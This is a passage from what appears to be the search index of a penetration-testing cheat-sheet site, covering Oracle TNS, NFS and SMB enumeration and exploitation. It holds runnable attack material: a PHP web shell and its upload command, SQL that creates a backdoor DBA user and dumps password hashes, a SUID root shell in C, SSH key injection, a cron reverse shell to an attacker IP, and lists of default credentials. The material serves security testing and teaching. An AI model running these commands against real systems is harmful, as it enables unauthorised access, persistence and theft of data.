(XE, ORCL)</li> <li> SID brute force attacks</li> <li> Custom SID wordlist testing</li> <li> Service name enumeration</li> </ul>"},{"location":"database/oracle-tns/#authentication-testing","title":"Authentication Testing","text":"<ul> <li> Default credential testing</li> <li> Password brute force attacks</li> <li> Account status verification</li> <li> SYSDBA privilege testing</li> </ul>"},{"location":"database/oracle-tns/#database-enumeration","title":"Database Enumeration","text":"<ul> <li> Schema and table discovery</li> <li> User and privilege enumeration</li> <li> System configuration analysis</li> <li> Sensitive data identification</li> </ul>"},{"location":"database/oracle-tns/#file-system-testing","title":"File System Testing","text":"<ul> <li> File upload capabilities</li> <li> File download testing</li> <li> Directory traversal attempts</li> <li> Web shell deployment</li> </ul>"},{"location":"database/oracle-tns/#critical-security-issues","title":"Critical Security Issues","text":""},{"location":"database/oracle-tns/#default-credentials_1","title":"Default Credentials","text":"<ul> <li>Impact: Full database access, privilege escalation</li> <li>Detection: Successful login with default accounts</li> <li>Exploitation: <code>sqlplus system/manager@target:1521/XE</code></li> </ul>"},{"location":"database/oracle-tns/#sysdba-privilege-escalation","title":"SYSDBA Privilege Escalation","text":"<ul> <li>Impact: Complete database administrative access</li> <li>Detection: Regular user can connect as SYSDBA</li> <li>Exploitation: <code>sqlplus scott/tiger@target:1521/XE as sysdba</code></li> </ul>"},{"location":"database/oracle-tns/#file-system-access_1","title":"File System Access","text":"<ul> <li>Impact: Web shell upload, sensitive file disclosure</li> <li>Detection: Successful file operations via UTL_FILE</li> <li>Exploitation: Web shell deployment, configuration file access</li> </ul>"},{"location":"database/oracle-tns/#information-disclosure_1","title":"Information Disclosure","text":"<ul> <li>Impact: Password hash exposure, sensitive data access</li> <li>Detection: Access to sys.user$ and other system tables</li> <li>Exploitation: Password cracking, data exfiltration</li> </ul>"},{"location":"database/oracle-tns/#network-exposure","title":"Network Exposure","text":"<ul> <li>Impact: Remote database access, increased attack surface</li> <li>Detection: TNS listener accessible from external networks</li> <li>Exploitation: Remote enumeration and exploitation</li> </ul>"},{"location":"database/oracle-tns/#common-oracle-sids","title":"Common Oracle SIDs","text":""},{"location":"database/oracle-tns/#default-sids","title":"Default SIDs","text":"<pre><code>XE          - Oracle Express Edition\nORCL        - Oracle Database\nPLSExtProc  - PL/SQL External Procedures\nXEXDB       - Oracle XE XML Database\n</code></pre>"},{"location":"database/oracle-tns/#enterprise-sids","title":"Enterprise SIDs","text":"<pre><code>PROD        - Production database\nDEV         - Development database\nTEST        - Testing database\nSTAGE       - Staging database\nDB01        - Generic database naming\n</code></pre>"},{"location":"database/oracle-tns/#default-oracle-accounts","title":"Default Oracle Accounts","text":""},{"location":"database/oracle-tns/#system-accounts","title":"System Accounts","text":"<pre><code>sys/change_on_install   - System administrator\nsystem/manager         - System DBA\nsysman/sysman          - Enterprise Manager\ndbsnmp/dbsnmp          - SNMP monitoring\n</code></pre>"},{"location":"database/oracle-tns/#application-accounts","title":"Application Accounts","text":"<pre><code>scott/tiger            - Sample schema\nhr/hr                  - Human Resources schema\noe/oe                  - Order Entry schema\nsh/sh                  - Sales History schema\n</code></pre>"},{"location":"database/oracle-tns/#oracle-configuration-files","title":"Oracle Configuration Files","text":""},{"location":"database/oracle-tns/#tns-configuration","title":"TNS Configuration","text":"<pre><code># tnsnames.ora - Client-side service names\n$ORACLE_HOME/network/admin/tnsnames.ora\n\n# listener.ora - Server-side listener configuration\n$ORACLE_HOME/network/admin/listener.ora\n\n# sqlnet.ora - Network configuration\n$ORACLE_HOME/network/admin/sqlnet.ora\n</code></pre>"},{"location":"database/oracle-tns/#common-paths","title":"Common Paths","text":"<pre><code>Linux:   $ORACLE_HOME/network/admin/\nWindows: %ORACLE_HOME%\\network\\admin\\\n</code></pre>"},{"location":"database/oracle-tns/#advanced-exploitation","title":"Advanced Exploitation","text":""},{"location":"database/oracle-tns/#web-shell-deployment","title":"Web Shell Deployment","text":"<pre><code># Create PHP web shell\necho '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php\n\n# Upload to web directory\n./odat.py utlfile -s target -d XE -U scott -P tiger --sysdba --putFile /var/www/html shell.php ./shell.php\n\n# Access web shell\ncurl http://target/shell.php?cmd=whoami\n</code></pre>"},{"location":"database/oracle-tns/#persistence-techniques","title":"Persistence Techniques","text":"<pre><code>-- Create backdoor user\nCREATE USER backdoor IDENTIFIED BY password;\nGRANT CONNECT, RESOURCE, DBA TO backdoor;\n\n-- Create job for persistence\nBEGIN\n  DBMS_SCHEDULER.CREATE_JOB(\n    job_name =&gt; 'BACKDOOR_JOB',\n    job_type =&gt; 'PLSQL_BLOCK',\n    job_action =&gt; 'BEGIN NULL; END;',\n    start_date =&gt; SYSTIMESTAMP,\n    repeat_interval =&gt; 'FREQ=DAILY',\n    enabled =&gt; TRUE\n  );\nEND;\n/\n</code></pre>"},{"location":"database/oracle-tns/#data-exfiltration","title":"Data Exfiltration","text":"<pre><code>-- Export sensitive data\nSELECT username||':'||password FROM sys.user$;\n\n-- Large data extraction\nSELECT * FROM (SELECT * FROM sensitive_table) WHERE ROWNUM &lt;= 1000;\n</code></pre>"},{"location":"file/","title":"File Services","text":"<p>File sharing services are common attack vectors due to frequent misconfigurations and the sensitive nature of shared data.</p>"},{"location":"file/#overview","title":"Overview","text":"<p>File service enumeration focuses on:</p> <ul> <li>Share enumeration and access testing</li> <li>Permission analysis and bypass</li> <li>Anonymous access identification</li> <li>Credential requirement assessment</li> <li>Data extraction opportunities</li> </ul>"},{"location":"file/#common-file-services","title":"Common File Services","text":""},{"location":"file/#smb-ports-445-139","title":"SMB (Ports 445, 139)","text":"<p>Server Message Block protocol provides Windows-based file and printer sharing.</p> <p>Key Attack Vectors: - Null session enumeration - Share permission bypass - RID cycling for user enumeration - Administrative share access</p> <p>View SMB Cheat Sheet</p>"},{"location":"file/#nfs-ports-2049-111","title":"NFS (Ports 2049, 111)","text":"<p>Network File System provides Unix/Linux distributed file sharing capabilities.</p> <p>Key Attack Vectors: - Export enumeration and mounting - UID/GID manipulation - no_root_squash exploitation - Weak export permissions</p> <p>View NFS Cheat Sheet</p>"},{"location":"file/#general-methodology","title":"General Methodology","text":""},{"location":"file/#1-discovery","title":"1. Discovery","text":"<pre><code># Port scanning\nnmap -p 139,445,111,2049 target\n\n# Service detection\nnmap -sV -sC -p &lt;ports&gt; target\n</code></pre>"},{"location":"file/#2-enumeration","title":"2. Enumeration","text":"<pre><code># SMB enumeration\nenum4linux target\nsmbclient -L //target -N\n\n# NFS enumeration\nshowmount -e target\nrpcinfo -p target\n</code></pre>"},{"location":"file/#3-access-testing","title":"3. Access Testing","text":"<pre><code># Anonymous access\nsmbclient //target/share -N\nmount -t nfs target:/export /mnt\n\n# Authenticated access\nsmbclient //target/share -U username\n</code></pre>"},{"location":"file/#4-exploitation","title":"4. Exploitation","text":"<ul> <li>Extract sensitive files</li> <li>Escalate privileges</li> <li>Plant backdoors</li> <li>Lateral movement</li> </ul>"},{"location":"file/#security-considerations","title":"Security Considerations","text":"<p>When testing file services:</p> <ul> <li>Data sensitivity - File shares often contain sensitive data</li> <li>System integrity - Avoid modifying critical files</li> <li>Access logging - File access is typically logged</li> <li>Network performance - Large file operations can impact network</li> </ul>"},{"location":"file/#common-misconfigurations","title":"Common Misconfigurations","text":""},{"location":"file/#smb-issues","title":"SMB Issues","text":"<ul> <li>Anonymous access to sensitive shares</li> <li>Weak share permissions</li> <li>Null session information disclosure</li> <li>Administrative share exposure</li> </ul>"},{"location":"file/#nfs-issues","title":"NFS Issues","text":"<ul> <li>World-readable exports</li> <li>no_root_squash misconfiguration</li> <li>Weak export restrictions</li> <li>Insecure RPC configuration</li> </ul>"},{"location":"file/#exploitation-techniques","title":"Exploitation Techniques","text":""},{"location":"file/#smb-exploitation","title":"SMB Exploitation","text":"<ul> <li>Share enumeration and access</li> <li>User and group enumeration</li> <li>Password policy extraction</li> <li>Administrative access</li> </ul>"},{"location":"file/#nfs-exploitation","title":"NFS Exploitation","text":"<ul> <li>Export mounting and access</li> <li>UID manipulation for privilege escalation</li> <li>File system modification</li> <li>Backdoor placement</li> </ul>"},{"location":"file/#tools-and-resources","title":"Tools and Resources","text":""},{"location":"file/#essential-tools","title":"Essential Tools","text":"<ul> <li>nmap - Service discovery and scripting</li> <li>enum4linux - SMB enumeration</li> <li>smbclient - SMB client access</li> <li>showmount - NFS export enumeration</li> </ul>"},{"location":"file/#specialized-tools","title":"Specialized Tools","text":"<ul> <li>rpcclient - RPC client for Windows</li> <li>smbmap - SMB share enumeration</li> <li>crackmapexec - SMB and other protocol testing</li> <li>mount - NFS mounting</li> </ul> <p>Select a specific file service above to access detailed enumeration and exploitation techniques.</p>"},{"location":"file/nfs/","title":"NFS Enumeration Cheat Sheet","text":""},{"location":"file/nfs/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Overview</li> <li>Ports &amp; Protocols</li> <li>Quick Discovery</li> <li>Essential Enumeration Workflow</li> <li>Share Discovery</li> <li>Mounting NFS Shares</li> <li>File Analysis</li> <li>Exploitation Techniques</li> <li>Writable Share Exploitation</li> <li>Root Squash Bypass</li> <li>UID/GID Manipulation</li> <li>Privilege Escalation</li> <li>Persistence &amp; Data Extraction</li> <li>Common Misconfigurations</li> <li>Quick Reference Commands</li> <li>Testing Checklist</li> <li>Critical Vulnerabilities</li> </ol>"},{"location":"file/nfs/#overview","title":"Overview","text":"<p>NFS (Network File System) is a distributed file system protocol that allows remote file access over a network as if files were local. Developed by Sun Microsystems, it's primarily used between Linux/Unix systems.</p>"},{"location":"file/nfs/#key-functions","title":"Key Functions","text":"<ul> <li>Remote File Access: Mount remote filesystems locally</li> <li>Transparent Access: Files appear as local to applications</li> <li>Network Sharing: Cross-platform file sharing in Unix environments</li> <li>Distributed Storage: Centralized file storage with network access</li> </ul>"},{"location":"file/nfs/#why-nfs-matters-in-pentesting","title":"Why NFS Matters in Pentesting","text":"<ul> <li>Weak Authentication: Often relies on IP-based access control</li> <li>UID/GID Mapping: Client-side user ID mapping can be manipulated</li> <li>Privilege Escalation: Misconfigured shares allow root access</li> <li>Data Exposure: Sensitive files often shared without proper restrictions</li> <li>Legacy Issues: Older versions lack proper security controls</li> </ul>"},{"location":"file/nfs/#common-attack-vectors","title":"Common Attack Vectors","text":"<ul> <li>Anonymous Access: IP-based restrictions can be bypassed</li> <li>UID Spoofing: Create local users with target UIDs for access</li> <li>Root Squash Bypass: Exploit <code>no_root_squash</code> configurations</li> <li>Writable Shares: Upload malicious files, backdoors, SUID binaries</li> <li>Information Disclosure: Extract sensitive data from exposed shares</li> </ul>"},{"location":"file/nfs/#ports-protocols","title":"Ports &amp; Protocols","text":"<pre><code>111/tcp,udp - RPCbind/Portmapper (ONC-RPC/SUN-RPC)\n2049/tcp,udp - NFS (Network File System)\n</code></pre>"},{"location":"file/nfs/#nfs-versions","title":"NFS Versions","text":"Version Features Security NFSv2 Legacy, UDP only No authentication NFSv3 Better performance, TCP/UDP Machine-based auth NFSv4 Kerberos, stateful, port 2049 only User authentication NFSv4.1 Cluster support, performance improvements Enhanced security"},{"location":"file/nfs/#quick-discovery","title":"Quick Discovery","text":"<pre><code># Port scan\nnmap -p 111,2049 --open -sV target\n\n# NFS-specific scan with scripts\nnmap -p 111,2049 --script=nfs-ls,nfs-showmount,nfs-statfs target\n\n# Comprehensive NFS enumeration\nnmap --script nfs* -p 111,2049 -sV target\n</code></pre>"},{"location":"file/nfs/#essential-enumeration-workflow","title":"Essential Enumeration Workflow","text":""},{"location":"file/nfs/#1-share-discovery","title":"1. Share Discovery","text":""},{"location":"file/nfs/#rpc-information-gathering","title":"RPC Information Gathering","text":"<pre><code># Query RPC services\nrpcinfo -p target\n# Shows all RPC services including NFS-related ones\n\n# Alternative RPC query\nrpcinfo -t target nfs\n</code></pre>"},{"location":"file/nfs/#nfs-share-enumeration","title":"NFS Share Enumeration","text":"<pre><code># List exported NFS shares\nshowmount -e target\n\n# List all mount points\nshowmount -a target\n\n# List directories being mounted\nshowmount -d target\n</code></pre>"},{"location":"file/nfs/#2-mounting-nfs-shares","title":"2. Mounting NFS Shares","text":""},{"location":"file/nfs/#basic-mounting","title":"Basic Mounting","text":"<pre><code># Create mount point\nmkdir /mnt/nfs_target\n\n# Mount NFS share\nsudo mount -t nfs target:/exported/path /mnt/nfs_target\n\n# Mount with nolock option (common requirement)\nsudo mount -t nfs target:/exported/path /mnt/nfs_target -o nolock\n</code></pre>"},{"location":"file/nfs/#advanced-mounting-options","title":"Advanced Mounting Options","text":"<pre><code># Mount with specific UID (bypass restrictions)\nsudo mount -o nolock,uid=1000 target:/share /mnt/nfs_target\n\n# Mount with specific GID\nsudo mount -o nolock,gid=1000 target:/share /mnt/nfs_target\n\n# Mount with rw permissions\nsudo mount -o rw,nolock target:/share /mnt/nfs_target\n\n# Check mounted shares\nmount | grep nfs\n</code></pre>"},{"location":"file/nfs/#3-file-analysis","title":"3. File Analysis","text":""},{"location":"file/nfs/#permission-analysis","title":"Permission Analysis","text":"<pre><code># List with usernames/groups\nls -l /mnt/nfs_target/\n\n# List with UID/GID numbers\nls -n /mnt/nfs_target/\n\n# Recursive listing\nfind /mnt/nfs_target -ls\n</code></pre>"},{"location":"file/nfs/#content-discovery","title":"Content Discovery","text":"<pre><code># Search for interesting files\nfind /mnt/nfs_target -type f -name \"*.key\"\nfind /mnt/nfs_target -type f -name \"*.conf\"\nfind /mnt/nfs_target -type f -name \"*password*\"\nfind /mnt/nfs_target -type f -name \"*backup*\"\n\n# Check for SUID files\nfind /mnt/nfs_target -type f -perm -4000 -ls\n</code></pre>"},{"location":"file/nfs/#exploitation-techniques","title":"Exploitation Techniques","text":""},{"location":"file/nfs/#writable-share-exploitation","title":"Writable Share Exploitation","text":"<pre><code># Test write permissions\necho \"test content\" &gt; /mnt/nfs_target/test.txt\n\n# VULNERABILITY: If successful, share allows unauthorized writes\n# Upload malicious files\ncp /path/to/webshell.php /mnt/nfs_target/\ncp /path/to/backdoor /mnt/nfs_target/\n</code></pre>"},{"location":"file/nfs/#root-squash-bypass","title":"Root Squash Bypass","text":"<pre><code># Check if no_root_squash is enabled\n# Create file as root and check ownership retention\n\nsudo touch /mnt/nfs_target/root_test\nls -l /mnt/nfs_target/root_test\n\n# If owner remains root (UID 0): VULNERABILITY - no_root_squash enabled\n# This allows full root access to the share\n</code></pre>"},{"location":"file/nfs/#uidgid-manipulation","title":"UID/GID Manipulation","text":"<pre><code># Create user with target UID\nsudo useradd -u 1000 nfs_user\n\n# Switch to target user\nsudo su nfs_user\n\n# Access files with matching UID\ncat /mnt/nfs_target/user_file.txt\n\n# Create user with UID 0 (if no_root_squash)\nsudo useradd -u 0 fake_root\nsudo su fake_root\n</code></pre>"},{"location":"file/nfs/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code># Create SUID binary for privilege escalation\n# On writable NFS share, create SUID shell\n\ncat &gt; /mnt/nfs_target/shell.c &lt;&lt; 'EOF'\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\nint main(void) {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash\");\n    return 0;\n}\nEOF\n\n# Compile and set SUID (requires root access on NFS server)\ngcc /mnt/nfs_target/shell.c -o /mnt/nfs_target/shell\nchmod u+s /mnt/nfs_target/shell\n\n# Execute on target system for privilege escalation\n</code></pre>"},{"location":"file/nfs/#persistence-data-extraction","title":"Persistence &amp; Data Extraction","text":""},{"location":"file/nfs/#ssh-key-injection","title":"SSH Key Injection","text":"<pre><code># Access user home directories via NFS\n# Inject SSH public key for persistent access\n\nmkdir -p /mnt/nfs_target/home/user/.ssh/\necho \"ssh-rsa AAAAB3... attacker@kali\" &gt;&gt; /mnt/nfs_target/home/user/.ssh/authorized_keys\nchmod 600 /mnt/nfs_target/home/user/.ssh/authorized_keys\n\n# SSH into target system\nssh user@target\n</code></pre>"},{"location":"file/nfs/#data-exfiltration","title":"Data Exfiltration","text":"<pre><code># Recursive file reading\nfind /mnt/nfs_target -type f -exec cat {} \\; &gt; extracted_data.txt\n\n# Copy sensitive files\ncp -r /mnt/nfs_target/etc/ ./nfs_etc_backup/\ncp -r /mnt/nfs_target/home/ ./nfs_home_backup/\n\n# Search for specific content\ngrep -r \"password\" /mnt/nfs_target/\ngrep -r \"secret\" /mnt/nfs_target/\n</code></pre>"},{"location":"file/nfs/#backdoor-placement","title":"Backdoor Placement","text":"<pre><code># Place cron job backdoor\necho \"* * * * * /bin/bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1\" &gt;&gt; /mnt/nfs_target/etc/crontab\n\n# Web application backdoor\necho '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; /mnt/nfs_target/var/www/html/shell.php\n</code></pre>"},{"location":"file/nfs/#common-misconfigurations","title":"Common Misconfigurations","text":""},{"location":"file/nfs/#high-risk-nfs-export-options","title":"High-Risk NFS Export Options","text":"<pre><code># Check /etc/exports for dangerous settings:\n# rw - Read/write access\n# no_root_squash - Root privileges retained\n# insecure - Ports above 1024 allowed\n# nohide - Exposes mounted filesystems\n\n# Example dangerous export:\n# /home *(rw,no_root_squash,insecure)\n</code></pre>"},{"location":"file/nfs/#configuration-analysis","title":"Configuration Analysis","text":"<pre><code># View export configuration (if accessible)\ncat /mnt/nfs_target/etc/exports\n\n# Check for world-writable directories\nfind /mnt/nfs_target -type d -perm -o+w -ls\n\n# Look for backup files\nfind /mnt/nfs_target -name \"*.bak\" -o -name \"*.backup\" -o -name \"*~\"\n</code></pre>"},{"location":"file/nfs/#quick-reference-commands","title":"Quick Reference Commands","text":""},{"location":"file/nfs/#discovery","title":"Discovery","text":"<pre><code>nmap -p 111,2049 --script nfs* target\nrpcinfo -p target\nshowmount -e target\n</code></pre>"},{"location":"file/nfs/#mounting","title":"Mounting","text":"<pre><code>mkdir /mnt/nfs_target\nsudo mount -t nfs target:/share /mnt/nfs_target -o nolock\nmount | grep nfs\n</code></pre>"},{"location":"file/nfs/#analysis","title":"Analysis","text":"<pre><code>ls -la /mnt/nfs_target/\nfind /mnt/nfs_target -type f -perm -4000\ngrep -r \"password\" /mnt/nfs_target/\n</code></pre>"},{"location":"file/nfs/#cleanup","title":"Cleanup","text":"<pre><code>cd /\nsudo umount /mnt/nfs_target\nrmdir /mnt/nfs_target\n</code></pre>"},{"location":"file/nfs/#testing-checklist","title":"Testing Checklist","text":""},{"location":"file/nfs/#discovery_1","title":"Discovery","text":"<ul> <li> Port 111/2049 open and accessible</li> <li> RPC services enumeration</li> <li> NFS version identification</li> <li> Share listing via showmount</li> </ul>"},{"location":"file/nfs/#access-testing","title":"Access Testing","text":"<ul> <li> Anonymous share mounting</li> <li> Read access to mounted shares</li> <li> Write access testing</li> <li> File permission analysis</li> </ul>"},{"location":"file/nfs/#configuration-assessment","title":"Configuration Assessment","text":"<ul> <li> Export options analysis (/etc/exports)</li> <li> Root squash configuration</li> <li> Insecure port usage</li> <li> World-writable directories</li> </ul>"},{"location":"file/nfs/#exploitation","title":"Exploitation","text":"<ul> <li> UID/GID manipulation attempts</li> <li> SUID binary creation (if writable)</li> <li> SSH key injection opportunities</li> <li> Backdoor placement feasibility</li> </ul>"},{"location":"file/nfs/#data-assessment","title":"Data Assessment","text":"<ul> <li> Sensitive file discovery</li> <li> Configuration file access</li> <li> User directory enumeration</li> <li> Backup file identification</li> </ul>"},{"location":"file/nfs/#critical-vulnerabilities","title":"Critical Vulnerabilities","text":""},{"location":"file/nfs/#anonymous-share-access","title":"Anonymous Share Access","text":"<ul> <li>Impact: Unauthorized data access, information disclosure</li> <li>Detection: <code>showmount -e target</code> returns shares without authentication</li> <li>Exploitation: Mount shares and extract sensitive data</li> </ul>"},{"location":"file/nfs/#no-root-squash","title":"No Root Squash","text":"<ul> <li>Impact: Full root access to shared filesystem</li> <li>Detection: Files created as root retain root ownership</li> <li>Exploitation: Create SUID binaries, modify system files</li> </ul>"},{"location":"file/nfs/#writable-world-shares","title":"Writable World Shares","text":"<ul> <li>Impact: File upload, backdoor deployment, data modification</li> <li>Detection: Successful file creation in mounted share</li> <li>Exploitation: Upload webshells, backdoors, persistence mechanisms</li> </ul>"},{"location":"file/nfs/#uidgid-bypass","title":"UID/GID Bypass","text":"<ul> <li>Impact: Access to user files, privilege escalation</li> <li>Detection: File access changes with UID modification</li> <li>Exploitation: Create local users with target UIDs for file access</li> </ul>"},{"location":"file/nfs/#information-disclosure","title":"Information Disclosure","text":"<ul> <li>Impact: Sensitive data exposure, credential harvesting</li> <li>Detection: Access to configuration files, user directories</li> <li>Exploitation: Extract passwords, SSH keys, application configs</li> </ul>"},{"location":"file/nfs/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"file/nfs/#nfs-version-downgrade","title":"NFS Version Downgrade","text":"<pre><code># Force NFSv2 usage (weaker security)\nsudo mount -t nfs -o vers=2 target:/share /mnt/nfs_target\n\n# Force NFSv3 usage\nsudo mount -t nfs -o vers=3 target:/share /mnt/nfs_target\n</code></pre>"},{"location":"file/nfs/#network-based-attacks","title":"Network-Based Attacks","text":"<pre><code># NFS over UDP (potentially less secure)\nsudo mount -t nfs -o udp target:/share /mnt/nfs_target\n\n# Specify custom port\nsudo mount -t nfs -o port=2049 target:/share /mnt/nfs_target\n</code></pre>"},{"location":"file/nfs/#stealth-techniques","title":"Stealth Techniques","text":"<pre><code># Mount to hidden directory\nmkdir /tmp/.nfs_hidden\nsudo mount -t nfs target:/share /tmp/.nfs_hidden -o nolock\n\n# Use soft mount (timeout on failure)\nsudo mount -t nfs -o soft,timeo=1 target:/share /mnt/nfs_target\n</code></pre>"},{"location":"file/smb/","title":"SMB Enumeration Cheat Sheet","text":""},{"location":"file/smb/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Overview</li> <li>Ports &amp; Protocols</li> <li>Quick Discovery</li> <li>Essential Enumeration Workflow</li> <li>Host Enumeration</li> <li>Share Enumeration</li> <li>Share Access</li> <li>File Enumeration Techniques</li> <li>smbclient Commands</li> <li>Automated File Discovery</li> <li>Mass File Search</li> <li>User Enumeration</li> <li>RID Cycling</li> <li>SAM Remote Protocol</li> <li>Manual User Enumeration</li> <li>Vulnerability Scanning</li> <li>Common Default Shares</li> <li>Attack Scenarios</li> <li>Null Session Share Access</li> <li>Guest Account Enumeration</li> <li>Authenticated Enumeration</li> <li>Key Security Issues<ul> <li>High-Risk Configurations</li> <li>Common Misconfigurations</li> </ul> </li> <li>Advanced Techniques<ul> <li>Kerberos Authentication</li> <li>Password Spraying</li> </ul> </li> <li>Quick Reference Commands</li> <li>Testing Checklist</li> <li>Critical Vulnerabilities</li> </ol>"},{"location":"file/smb/#overview","title":"Overview","text":"<p>SMB (Server Message Block) is a network protocol for file/printer sharing and inter-process communication in Windows environments. Originally developed by IBM, it's now primarily associated with Microsoft Windows.</p>"},{"location":"file/smb/#key-functions","title":"Key Functions","text":"<ul> <li>File Sharing: Access remote files and directories</li> <li>Printer Sharing: Network printer access</li> <li>Named Pipes: Inter-process communication</li> <li>Authentication: User/computer authentication in domains</li> </ul>"},{"location":"file/smb/#why-smb-matters-in-pentesting","title":"Why SMB Matters in Pentesting","text":"<ul> <li>Ubiquitous: Found on virtually all Windows networks</li> <li>High Privilege: Often runs with SYSTEM/Administrator privileges</li> <li>Information Rich: Exposes users, shares, and system information</li> <li>Attack Surface: Frequent target for lateral movement and privilege escalation</li> <li>Legacy Issues: Older versions (SMBv1) have critical vulnerabilities</li> </ul>"},{"location":"file/smb/#common-attack-vectors","title":"Common Attack Vectors","text":"<ul> <li>Anonymous Enumeration: Null sessions reveal sensitive information</li> <li>Credential Attacks: Password spraying, brute force</li> <li>Share Exploitation: Writable shares, sensitive file exposure</li> <li>Vulnerability Exploitation: EternalBlue (MS17-010), legacy flaws</li> <li>Lateral Movement: Pass-the-hash, credential reuse</li> </ul>"},{"location":"file/smb/#ports-protocols","title":"Ports &amp; Protocols","text":"<pre><code>139/tcp - NetBIOS Session Service (SMB over NetBIOS)\n445/tcp - SMB over TCP (Direct, modern)\n</code></pre>"},{"location":"file/smb/#quick-discovery","title":"Quick Discovery","text":"<pre><code># Port scan\nnmap -p 139,445 --open -sV target\n\n# Service detection\nnmap -p 139,445 -sC -sV target\n</code></pre>"},{"location":"file/smb/#essential-enumeration-workflow","title":"Essential Enumeration Workflow","text":""},{"location":"file/smb/#1-host-enumeration","title":"1. Host Enumeration","text":"<pre><code># NetExec - Get OS info, SMB version, signing status\nnetexec smb target\n\n# Example output shows: OS, domain, SMB version, signing enabled/disabled\n</code></pre>"},{"location":"file/smb/#2-share-enumeration","title":"2. Share Enumeration","text":""},{"location":"file/smb/#null-session-attacks","title":"Null Session Attacks","text":"<pre><code># smbclient - List shares (unauthenticated)\nsmbclient -L -N //target\n# VULNERABILITY: Anonymous share enumeration allowed\n\n# NetExec variations\nnetexec smb target --shares\nnetexec smb target -u guest -p '' --shares\nnetexec smb target -u '' -p '' --shares\n</code></pre>"},{"location":"file/smb/#with-credentials","title":"With Credentials","text":"<pre><code># NetExec with valid creds\nnetexec smb target -u username -p password --shares\n\n# smbclient with creds\nsmbclient -L //target -U username%password\n</code></pre>"},{"location":"file/smb/#3-share-access","title":"3. Share Access","text":""},{"location":"file/smb/#null-session-access","title":"Null Session Access","text":"<pre><code># Access share without authentication\nsmbclient //target/share -N\n# VULNERABILITY: Anonymous access to sensitive shares\n\n# Common shares to test\nsmbclient //target/IPC$ -N\nsmbclient //target/C$ -N\nsmbclient //target/ADMIN$ -N\n</code></pre>"},{"location":"file/smb/#authenticated-access","title":"Authenticated Access","text":"<pre><code># With username/password\nsmbclient //target/share -U username%password\n\n# Kerberos authentication\nsmbclient.py 'domain/user:pass@target' -k -no-pass\n</code></pre>"},{"location":"file/smb/#file-enumeration-techniques","title":"File Enumeration Techniques","text":""},{"location":"file/smb/#smbclient-commands","title":"smbclient Commands","text":"<pre><code># Once connected to a share:\nls                    # List files\ncd directory         # Change directory\nget filename         # Download file\nput filename         # Upload file\nhelp                 # Show all commands\n!command             # Execute local shell command\n</code></pre>"},{"location":"file/smb/#automated-file-discovery","title":"Automated File Discovery","text":"<pre><code># NetExec spider module\nnetexec smb target -u user -p pass -M spider_plus\n\n# Output saved to /tmp/nxc_spider_plus/target.json\n</code></pre>"},{"location":"file/smb/#mass-file-search","title":"Mass File Search","text":"<pre><code># MANSPIDER - Search for sensitive files\nmanspider --threads 256 target -u username -p password --filetype pdf,doc,docx,xls,xlsx\n</code></pre>"},{"location":"file/smb/#user-enumeration","title":"User Enumeration","text":""},{"location":"file/smb/#rid-cycling","title":"RID Cycling","text":"<pre><code># Impacket lookupsid\nlookupsid.py guest@target -no-pass\n\n# NetExec RID brute force\nnetexec smb target -u guest -p '' --rid-brute\n\n# Manual RID cycling with rpcclient\nrpcclient -U \"\" target\nrpcclient $&gt; lookupsids S-1-5-21-[DOMAIN-SID]-500\n</code></pre>"},{"location":"file/smb/#sam-remote-protocol","title":"SAM Remote Protocol","text":"<pre><code># Dump user information via SAM\nsamrdump.py domain/user:pass@target\n</code></pre>"},{"location":"file/smb/#manual-user-enumeration","title":"Manual User Enumeration","text":"<pre><code># rpcclient interactive session\nrpcclient -U \"\" target\n\n# Common rpcclient commands:\nenumdomusers         # List domain users\nqueryuser [RID]      # Get user details\nenumdomgroups        # List domain groups\nquerygroup [RID]     # Get group details\n</code></pre>"},{"location":"file/smb/#vulnerability-scanning","title":"Vulnerability Scanning","text":"<pre><code># Nmap SMB vulnerability scripts\nnmap --script smb-vuln* -p 139,445 target\n\n# Common vulnerabilities to check:\n# - MS17-010 (EternalBlue)\n# - MS08-067 (Conficker)\n# - MS06-025\n</code></pre>"},{"location":"file/smb/#common-default-shares","title":"Common Default Shares","text":"Share Type Description Risk Level ADMIN$ Disk Remote admin HIGH C$ Disk Default root share HIGH IPC$ IPC Inter-process communication MEDIUM NETLOGON Disk Logon server share MEDIUM SYSVOL Disk Domain policies MEDIUM"},{"location":"file/smb/#attack-scenarios","title":"Attack Scenarios","text":""},{"location":"file/smb/#scenario-1-null-session-share-access","title":"Scenario 1: Null Session Share Access","text":"<pre><code># Discovery\nsmbclient -L -N //target\n\n# Access attempt\nsmbclient //target/Users -N\n# If successful: VULNERABILITY - Anonymous access to user directories\n</code></pre>"},{"location":"file/smb/#scenario-2-guest-account-enumeration","title":"Scenario 2: Guest Account Enumeration","text":"<pre><code># Share enumeration\nnetexec smb target -u guest -p '' --shares\n\n# User enumeration\nnetexec smb target -u guest -p '' --rid-brute\n# If successful: VULNERABILITY - Information disclosure via guest account\n</code></pre>"},{"location":"file/smb/#scenario-3-authenticated-enumeration","title":"Scenario 3: Authenticated Enumeration","text":"<pre><code># Full enumeration with valid creds\nnetexec smb target -u user -p pass --shares\nnetexec smb target -u user -p pass -M spider_plus\nsamrdump.py domain/user:pass@target\n</code></pre>"},{"location":"file/smb/#key-security-issues-to-look-for","title":"Key Security Issues to Look For","text":""},{"location":"file/smb/#high-risk-configurations","title":"High-Risk Configurations","text":"<ul> <li>Anonymous share listing: <code>smbclient -L -N //target</code> succeeds</li> <li>Guest account enabled: Authentication with guest:'' works</li> <li>Writable shares: Upload capabilities without authentication</li> <li>Sensitive file exposure: Config files, backups in accessible shares</li> <li>SMBv1 enabled: Legacy protocol with known vulnerabilities</li> </ul>"},{"location":"file/smb/#common-misconfigurations","title":"Common Misconfigurations","text":"<pre><code># Check for writable shares\necho \"test\" | smbclient //target/share -N -c \"put - test.txt\"\n\n# Look for backup files\n# .bak, .old, .backup extensions in shares\n\n# Check for configuration files\n# web.config, database.conf, etc.\n</code></pre>"},{"location":"file/smb/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"file/smb/#kerberos-authentication","title":"Kerberos 